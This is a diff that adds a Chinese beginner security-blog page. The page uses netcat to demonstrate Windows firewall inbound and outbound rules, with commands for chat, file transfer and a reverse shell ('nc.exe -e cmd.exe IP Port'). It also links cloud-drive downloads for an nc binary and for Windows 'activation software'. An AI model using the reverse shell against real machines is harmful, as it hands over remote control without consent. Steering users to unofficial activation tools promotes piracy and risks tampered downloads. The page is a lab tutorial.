@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+
+<!--欢迎来到hk987，人类的进化就靠你了-->
+ <!--
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░ ░▒▓██████▓▒░░▒▓████████▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░▒▓█▓▒░ 
+░▒▓████████▓▒░▒▓███████▓▒░░░▒▓███████▓▒░░▒▓██████▓▒░░░░░░▒▓█▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░░░░░░▒▓█▓▒░░░▒▓█▓▒░▒▓█▓▒░░░░░▒▓█▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░░░░░░▒▓█▓▒░░░▒▓█▓▒░▒▓█▓▒░░░░▒▓█▓▒░   
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░ ░▒▓██████▓▒░░░░▒▓█▓▒░
+-->
+<!--前进!不择手段的前进-->
+<!--Copyright©hk987.fun-->
+<!--PC端Google和Firefox支持良好,移动端支持良好-->
+
+<html lang="zh-cn">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+	<meta name="description" content="hk987-你在世俗里的名字不重要了">
+	<meta name="author" content="hk987">
+	<meta name="keywords" content="hk987,hk987.fun,hk987,黑客987,黑客学习,Windows技术,Linux技术,Archlinux,Linux软件,漏洞挖掘,网络安全,渗透测试,自动化办公,python全自动办公,Windows系统激活,新手学电脑,IT技术,Rust,Rust编程,黑客技术,黑客,红客,honker,hack,hacker,网络安全,信息安全,网络安全学习,计算机小白,网安入门,网络安全入门,渗透测试,黑客技术,网络基础入门,操作系统,新手学电脑,小白学电脑,hack学习,hack入门,Windows基础,linux基础,Archlinux基础,Rust基础,Rust入门,Rust编程基础,黑客入门,Ubuntu入门,Manjaro,Endeavouros,红帽系统,centos基础学习,Rocky系统基础,Linux基础命令,Windows批处理,Windows安全,Linux安全,Kali基础,Kali渗透测试,KaliLinux,BlackArch,Github,加密解密,具体数学,线性代数,离散数学,红队攻防,蓝队攻防,黑客靶场练习,黑客靶场,黑客实战,hack实战,hack编程,黑客编程">
+	<title>[Win基础]-6-实战用三个nc实验理解防火墙策略 - hk987.fun - www.hk987.fun</title>
+	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.png">
+	<link rel="stylesheet" type="text/css" href="../css/basic.css">
+	<link rel="stylesheet" type="text/css" href="../css/home.css">
+	<link rel="stylesheet" type="text/css" href="../css/text.css">
+	<!--prism.js代码高亮模块-->
+	<link rel="stylesheet" href="../css/prism.css" data-noprefix />
+	<script src="../plugins/prism.js"></script>
+	<!--/prism.js代码高亮模块-->
+</head>
+<body>
+	<!--header -->
+	<header id="nav">
+			<div class="nav-container">
+				<!-- 根大纲-->
+				<a href="../index.html" title="Hk987首页">
+					<h1 class="nav-logo">HK987 - hk987.fun</h1>
+				</a>
+				<h2 class="nav-site-description desc-hidden">
+					 S=−k∑pilnpi
+				</h2>
+				<nav class="nav-links">
+					<!-- nav连接大纲-->
+					<h1 style="display:none;">网站导航</h1>
+					<ul>
+						<li>
+							<a href="../index.html" title="sitemap">
+								<span class="link-word"><img src="../logo/archives.png" alt="archives" class="link-img"><span class="word-hidden">wiki</span></span>
+							</a>
+						</li>
+					</ul>
+				</nav>
+			</div>
+	</header>
+	<!-- /header -->
+
+	<!-- content-->
+	<div id="content">
+		<div class="content-container">
+			<!-- 文章区 -->
+			<article class="text-container">
+				<header class="text-header">
+					<h1>[Win基础]-6-实战用三个nc实验理解防火墙策略</h1>	
+				</header>
+				<section class="text-body">
+					<h2>引言</h2>
+					<p>这篇文章通过一个模拟实战，利用nc这个工具，来理解防火墙出站入站策略对访问数据的影响。</p>
+					<!-- 目录 -->
+					<h2>文章目录</h2>
+					<ul class="contents">	
+						 <li><a href="#windows-firewall-1">0×1.视频中用到的nc命令解析</a></li>
+						 <li><a href="#windows-firewall-2">0×2.nc实验理解防火墙策略视频演示</a></li>
+					 </ul>
+					<!-- /目录 -->
+
+					<!-- 正文 -->
+					<h2 id="windows-firewall-1">0×1.视频中用到的nc命令解析</h2>
+
+					<p>首先，来看看nc是什么，根据诸多文档的描述，nc是一款功能强大的网络工具，在网络工具中有“瑞士军刀”美誉，并且有Windows和Linux两个版本。因为它短小精悍，功能实用，被设计为一个简单、可靠的网络工具，可通过TCP或UDP协议传输读写数据。同时，它还是一个网络应用Debug分析器，因为它可以根据需要创建各种不同类型的网络连接。</p>
+					<p>在渗透测试中，nc多用来作为反弹shell的接收端，就是因为如此，nc在诸多杀毒软件中，都会被当做病毒查杀。</p>
+
+					<p>视频中用到的命令：</p>
+					<pre class='line-numbers' data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！' >
+					<code class="lang-powershell">
+					#下面代码中1234为演示用的端口号，可以自定义，IP替换为服务器的IP地址，Port替换为服务器的端口号，例如：本列中如果监听端用1234，那么Port就替换成1234，与监听端一致即可
+					# 1.nc聊天：
+					//被动端监听
+					C:\Windows\System32&gt; nc.exe -lvvp 1234
+					//主动端连接 
+					C:\Windows\System32&gt; cn.exe IP Port
+
+					# 2.nc传输文件：
+					//监听的方式接收文件
+					C:\Windows\System32&gt; nc.exe -lvvp 1234 &gt; filename
+					//主动端发送文件到对端监听的端口
+					C:\Windows\System32&gt; nc.exe IP Port &lt; filename
+
+					//监听的方式发送文件
+					C:\Windows\System32&gt; nc.exe -lvvp 1234 &lt; filename
+					//直接去目标服务器取文件
+					C:\Windows\System32&gt; nc.exe IP Port &gt; filename
+					
+					# 3.nc反弹shell：（重点）
+					//监听端：
+					C:\Windows\System32&gt; nc.exe -lvvp 1234
+					//反弹端：
+					C:\Windows\System32&gt; nc.exe -e cmd.exe IP Port
+					</code>
+					</pre>
+
+					<h2 id="windows-firewall-2">0×2.nc实验理解防火墙策略视频演示</h2>
+	
+					<p>点击下方视频标题，可以进入B站观看高清版本</p>
+					<p>【第10天】Windows基础-10-实战用三个nc实验理解防火墙策略-windows防火墙入站出站搞不清？开始炫~大一女新生挑战一年精通网络安全-信息安全-计算机安全-计算机技术-黑客技术-渗透测试，我无所畏惧</p>
+					<iframe src="//player.bilibili.com/player.html?aid=278880001&bvid=BV19w411P7Z4&cid=1344777440&p=1&autoplay=0" allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" > </iframe>
+					<p>视频中用到的「nc」来自UC网盘分享：</p> 
+					<p>*「nc工具-windows版64位」:<a title="nc工具-windows版64位" style="color: rgb(4,181,150);" href="https://drive.uc.cn/s/dc10ff617ae54" target="_blank">点击打开</a> 密码：wSZU</p>
+
+					<p>第一篇文章中演示的虚拟机的下载可以通过我这个uc网盘去下载，里面包含了很多现成的系统镜像，还有虚拟机的激活码，也可以去官方下载，千万别去其他地方下精简版，很多问题都出在这里。网盘包含了最新的Windows+激活软件，流行的Linux镜像，会持续更新。</p>
+					<p>*「虚拟机全套软件+ISO镜像文件」(会一直持续更新):<a title="虚拟机全套软件+ISO镜像文件" style="color: rgb(4,181,150);" href="https://drive.uc.cn/s/eb63654987fb4" target="_blank">点击打开</a> 密码：8s6H</p>
+					<!-- /正文 -->
+
+				<footer class="text-footer">
+					<p>
+						*转载请注明来自:<a title="hk987.fun" style="color: rgb(4,181,150);" href="https://www.hk987.fun" target="_blank">hk987.fun</a>
+					</p>
+					<p>*原文连接:<a title="[Win基础]-6-实战用三个nc实验理解防火墙策略" style="color: rgb(4,181,150);" href="https://www.hk987.fun/hk/windows-base-6.html" target="_blank">https://www.hk987.fun/hk/windows-base-6.html</a></p>
+				</footer>
+			</article>
+			<!-- /文章区 -->	
+		</div>
+	</div>
+	<!-- /content -->
+	
+	<!-- footer -->
+	<footer id="footer">
+		<div class="footer-container">
+			hk987.fun &nbsp;<img src="../logo/copyright.png" alt="未经作者允许,禁止任何形式的复制与转载" title="未经作者允许,禁止任何形式的复制与转载">&nbsp;All Rights Reserved.
+		</div>
+	</footer>
+	<!-- /footer -->
+</body>
+</html>
